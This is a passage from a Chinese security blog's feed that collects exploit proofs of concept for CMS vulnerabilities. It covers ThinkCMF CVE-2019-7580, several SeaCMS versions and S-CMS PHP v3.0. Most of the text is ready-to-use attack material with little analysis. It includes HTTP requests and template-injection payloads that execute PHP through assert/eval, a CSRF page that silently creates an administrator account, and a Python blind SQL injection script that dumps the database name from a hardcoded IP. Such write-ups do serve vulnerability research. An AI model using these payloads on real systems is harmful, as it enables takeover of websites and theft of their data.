class="line">/../../../application/Common/index</span><br><span class="line">/../../../application/Portal/Lang/en-us/index</span><br><span class="line">/../../../application/Api/Lang/en-us/index</span><br><span class="line">/../../../application/Api/Lang/zh-cn/index</span><br><span class="line">/../../../application/Comment/Lang/en-us/index</span><br><span class="line">/../../../application/Comment/Lang/zh-cn/index</span><br></pre></td></tr></table></figure><blockquote><p>还有最后一句废话：模版注入对于linux 并不好用 : )  </p></blockquote><p>参考：<br><a href="https://xz.aliyun.com/t/3409" target="_blank" rel="noopener">https://xz.aliyun.com/t/3409</a><br><a href="https://xz.aliyun.com/t/3529" target="_blank" rel="noopener">https://xz.aliyun.com/t/3529</a><br><a href="https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2019-7580-thinkcmf-5-0-190111后台任意文件写入导致的代码执行"><a href="#CVE-2019-7580-thinkcmf-5-0-190111后台任意文件写入导致的代码执行" class="headerlink" title="CVE-2019-7580 thinkcmf-5.0.190111后台任意文件写入导致的代码执行"></a>CVE-2019-7580 thinkcmf-5.0.190111后台任意文件写入导致的代码执行</h2><h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><p>首先去thinkcmf下载5.0的最新版<br><a href="https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip" target="_blank" rel="noopener">https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip</a><br>切换到web根目录下，比如/var/www，然后新建一个目录：ThinkCMF-5.0.190111<br>把除public目录外的文件都移动到ThinkCMF-5.0.190111下。然后修改index.php，将其中的  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;CMF_ROOT&apos;, __DIR__ . &apos;/../&apos;);</span><br></pre></td></tr></table></figure><p>修改为  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;CMF_ROOT&apos;, __DIR__ . &apos;/ThinkCMF-5.0.190111/&apos;);</span><br></pre></td></tr></table></figure><p>然后一步步完成安装。<br>参考：<a href="https://blog.csdn.net/youaregoo/article/details/82219722" target="_blank" rel="noopener">https://blog.csdn.net/youaregoo/article/details/82219722</a>  </p><h1 id="0x01-利用过程："><a href="#0x01-利用过程：" class="headerlink" title="0x01 利用过程："></a>0x01 利用过程：</h1><p>后台登录状态下，<br>1、将payload插入数据库并读取然后写入data/conf/route.php文件  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /portal/admin_category/addpost.html</span><br><span class="line">parent_id=0&amp;name=111&amp;alias=a&apos;=&gt;array(%22%22)%2csleep(5)%2c&apos;b</span><br></pre></td></tr></table></figure><p>2、然后访问：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/portal/admin_category/index.html</span><br></pre></td></tr></table></figure><p>触发  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include data/conf/route.php</span><br></pre></td></tr></table></figure><p>操作，执行payload。下图以执行sleep(5)作为演示。  </p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /portal/admin_category/addpost.html HTTP/1.1</span><br><span class="line">Host: 192.168.170.209</span><br><span class="line">Content-Length: 183</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Cookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">parent_id=0&amp;name=111&amp;alias=1&apos;%3D%3Earray(%22%22)%2Cphpinfo()%2C&apos;2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="Affected-Version-6-61"><a href="#Affected-Version-6-61" class="headerlink" title="Affected Version 6.61"></a>Affected Version 6.61</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>后台的–&gt;添加影片–&gt; 图片地址–&gt;payload</p><p><code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code></p><p>访问</p><p><code>http://192.168.0.6/seacms661/detail/?1.html&amp;a=assert&amp;b=phpinfo();</code></p><p><code>http://192.168.0.6/seacms661/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html" target="_blank" rel="noopener">seacms backend getshell</a></p><p><a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="noopener">CVE-2018-14421——Seacms后台getshell分析</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Affected-Version-6-55"><a href="#Affected-Version-6-55" class="headerlink" title="Affected Version 6.55"></a>Affected Version 6.55</h2><p>链接:<a href="https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g" target="_blank" rel="noopener">https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g</a><br>密码:k4x1</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://192.168.0.6/seacms655/search.php?phpinfo(); post:searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.freebuf.com/vuls/150303.html" target="_blank" rel="noopener">海洋CMS（SEACMS）新版本V6.55补丁仍可被绕过执行任意代码</a></p><p><a href="https://github.com/SukaraLin/php_code_audit_project/blob/master/seacms/seacms%206.55%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">seacms 6.55 代码注入漏洞</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Affected-Version-6-54"><a href="#Affected-Version-6-54" class="headerlink" title="Affected Version 6.54"></a>Affected Version 6.54</h2><p>链接:<a href="https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA" target="_blank" rel="noopener">https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA</a>  </p><p>密码:qlwh</p><p>6.54 和6.53版本的不同之处是在：</p><p><code>search.php</code>的65行的<code>order</code>参数做了限制。</p><p><code>$order = ($order == &quot;commend&quot; || $order == &quot;time&quot; || $order == &quot;hit&quot;) ? $order : &quot;&quot;;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">更新日期：2017年8月7日 v6.54</span><br><span class="line">修复：紧急修复2处高危安全漏洞</span><br><span class="line"></span><br><span class="line">更新日期：2017年8月6日 v6.53</span><br><span class="line">新增：微信公众平台模块</span><br><span class="line">优化：采集逻辑</span><br><span class="line">修复：部分文字描述错误</span><br><span class="line">更新日期：2017年2月18日 v6.46</span><br><span class="line">修复：两处安全问题</span><br><span class="line"></span><br><span class="line">更新日期：2017年2月6日 v6.45</span><br><span class="line">修复：一处安全问题</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://192.168.0.6/seacms654/search.phpPOST：searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Affected-Version-6-45"><a href="#Affected-Version-6-45" class="headerlink" title="Affected Version 6.45"></a>Affected Version 6.45</h2><p> 下载地址：</p><p> 链接：<a href="https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw" target="_blank" rel="noopener">https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw</a> </p><p> 密码：cd48</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><code>http://127.0.0.1/seacms645/search.php</code></p><p><code>post:searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}</code></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://bbs.ichunqiu.com/thread-35085-1-1.htm" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-35085-1-1.htmlß</a></p><p><a href="http://0day5.com/archives/4249/" target="_blank" rel="noopener">http://0day5.com/archives/4249/</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/76595817</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%E4%BC%81%E4%B8%9A%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9FPHP%E7%89%88v3.0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8CSRF%E5%8F%AF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%E4%BC%81%E4%B8%9A%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9FPHP%E7%89%88v3.0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8CSRF%E5%8F%AF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>S-CMS企业建站系统PHP版v3.0后台存在CSRF可添加管理员权限账号</td><td>2019-02-22</td><td>qn（<a href="mailto:137535957@qq.cn" target="_blank" rel="noopener">137535957@qq.cn</a>）</td><td><a href="https://www.s-cms.cn" target="_blank" rel="noopener">https://www.s-cms.cn</a></td><td><a href="https://www.s-cms.cn" target="_blank" rel="noopener">https://www.s-cms.cn</a></td><td>PHP v3.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9040" target="_blank" rel="noopener">CVE-2019-9040</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>恶意攻击者可以精心伪造一个html页面诱骗已登录的管理用户点击，从而更改管理员账户密码。 </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>exp代码如下： </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>history.pushState('', '', '/')<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/1.com.php/admin/ajax.php?type=admin&amp;action=add&amp;lang=0"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>login"</span> <span class="attr">value</span>=<span class="string">"test1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>pwd"</span> <span class="attr">value</span>=<span class="string">"test1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>type"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a0"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a1"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a2"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a3"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a4"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a5"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a6"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a8"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a10"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a7"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a9"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>a11"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>textauth<span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>productauth<span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"A<span class="symbol">&amp;#95;</span>bbsauth<span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%20PHP%20v3.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%20PHP%20v3.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><table><thead><tr><th></th><th>漏洞名称</th><th>上报日期</th><th>漏洞发现者</th><th>产品首页</th><th>软件链接</th><th>版本</th><th>CVE编号</th></tr></thead><tbody><tr><td></td><td>S-CMS PHP v3.0存在SQL注入漏洞</td><td>2019-05-31</td><td>zhhhy</td><td><a href="https://www.s-cms.cn/download.html?code=php" target="_blank" rel="noopener">https://www.s-cms.cn/download.html?code=php</a></td><td><a href="https://www.s-cms.cn/download.html?code=php" target="_blank" rel="noopener">https://www.s-cms.cn/download.html?code=php</a></td><td>PHP v3.0</td><td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12860" target="_blank" rel="noopener">CVE-2019-12860</a></td><td></td></tr></tbody></table><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><blockquote><p>漏洞代码位置：/js/scms.php 第182-204行,在第83行处，变量$pageid接受使用POST方式传递的pageid的值。而在第87行和第95行处，变量$pageid被直接拼接进SQL语句之中，从而产生注入。而由于是数字型注入，避免使用单引号等符号以至于绕过了防御。 </p></blockquote><h3 id="POC实现代码如下："><a href="#POC实现代码如下：" class="headerlink" title="POC实现代码如下："></a>POC实现代码如下：</h3><blockquote><p>构造如下poc.py </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://106.14.144.32:2000/js/scms.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseLength</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始爆破数据库长度。。。'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        payload=<span class="string">"1%0Aand%0Aif(length(database())&gt;&#123;&#125;,1,0)#"</span>.format(i)</span><br><span class="line">        payload=urllib.parse.unquote(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'action'</span>:<span class="string">'jssdk'</span>,</span><br><span class="line">            <span class="string">'pagetype'</span>:<span class="string">'text'</span>,</span><br><span class="line">            <span class="string">'pageid'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># data = urllib.parse.unquote(data)</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        rs = requests.post(url=url,data=data)</span><br><span class="line">        rs.encode=<span class="string">'utf-8'</span></span><br><span class="line">        <span class="comment"># print(rs.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"20151019102732946.jpg"</span> <span class="keyword">not</span> <span class="keyword">in</span> rs.text:</span><br><span class="line">            print(<span class="string">"数据库名的长度为：&#123;&#125;"</span>.format(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'开始获取数据库名'</span>)</span><br><span class="line">    databasename = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    length = getDatabaseLength()</span><br><span class="line">    <span class="comment"># length = 4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload=<span class="string">'1%0Aand%0Aif(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,1,0)#'</span>.format(i,ord(c))</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = urllib.parse.unquote(payload)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'action'</span>: <span class="string">'jssdk'</span>,</span><br><span class="line">                <span class="string">'pagetype'</span>: <span class="string">'text'</span>,</span><br><span class="line">                <span class="string">'pageid'</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">            rs = requests.post(url=url, data=data)</span><br><span class="line">            rs.encode = <span class="string">'utf-8'</span></span><br><span class="line">            <span class="comment"># print(rs.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"20151019102732946.jpg"</span> <span class="keyword">in</span> rs.text:</span><br><span class="line">                databasename = databasename+c</span><br><span class="line">                print(databasename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> databasename</span><br><span class="line">getDatabaseName()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
